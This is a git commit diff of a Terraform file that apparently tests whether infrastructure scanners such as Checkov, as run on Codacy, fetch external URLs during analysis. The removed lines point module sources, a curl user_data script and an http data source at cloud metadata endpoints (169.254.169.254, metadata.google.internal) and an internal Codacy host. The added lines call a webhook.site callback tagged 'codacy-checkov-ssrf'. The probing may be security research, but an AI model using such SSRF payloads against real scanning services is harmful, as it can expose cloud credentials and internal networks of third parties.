e3ebaea57d5612047ec5e229496de26d425d8286
Bedis Nbiba <bedisnbiba@gmail.com>
2026-07-11 02:14:12 +0100

    Test Checkov SSRF via external URL

--- main.tf
+++ main.tf
@@ -1,28 +1,26 @@
-# SSRF Test - Terraform remote module reference
-module "ssrf_test" {
-  source = "git::https://169.254.169.254/latest/meta-data//test-module"
-}
+terraform {
+  required_version = ">= 0.12"
 
-module "ssrf_test2" {
-  source = "https://internal.codacy.internal/terraform-module"
-}
-
-resource "aws_instance" "test" {
-  ami           = "ami-12345678"
-  instance_type = "t2.micro"
-  
-  user_data = <<-EOF
-    #!/bin/bash
-    curl http://169.254.169.254/latest/meta-data/
-    curl http://metadata.google.internal/computeMetadata/v1/
-  EOF
-}
-
-# Test Checkov SSRF via external module references
-data "http" "ssrf_test" {
-  url = "http://169.254.169.254/latest/meta-data/"
-  
-  request_headers = {
-    Accept = "application/json"
+  required_providers {
+    test = {
+      source  = "registry.terraform.io/hashicorp/random"
+      version = "~> 3.0"
+    }
   }
+}
+
+# Test if checkpoint/trivy/checkov resolves external URLs during analysis
+data "http" "external_callback" {
+  url = "https://webhook.site/e5b582af-85d3-45c7-87a1-4adee0b98905/checkov-test"
+  request_headers = {
+    "X-Test" = "codacy-checkov-ssrf"
+  }
+}
+
+resource "random_pet" "test" {
+  length = 2
+}
+
+output "test_output" {
+  value = data.http.external_callback.body
 }
